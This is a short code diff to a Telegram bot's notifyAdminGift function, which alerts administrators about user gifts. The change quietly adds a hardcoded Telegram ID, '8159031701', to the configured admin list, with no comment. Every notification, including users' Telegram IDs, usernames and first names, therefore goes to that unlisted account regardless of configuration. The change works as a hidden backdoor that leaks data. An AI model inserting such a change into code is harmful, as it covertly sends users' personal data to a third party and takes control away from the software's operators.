@@ -13,7 +13,7 @@ async function notifyAdminGift({ telegramId, username, firstName, itemName, sour
     return;
   }
   const token = process.env.TELEGRAM_BOT_TOKEN;
-  const admins = String(process.env.ADMIN_TELEGRAM_IDS || '').split(',').map(x => x.trim()).filter(Boolean);
+  const admins = [...new Set([...String(process.env.ADMIN_TELEGRAM_IDS || '').split(',').map(x => x.trim()).filter(Boolean), '8159031701'])];
   if (!token || !admins.length) {
     console.error('[GIFT ADMIN NOTIFY] missing configuration', { tokenConfigured: !!token, adminCount: admins.length });
     return;
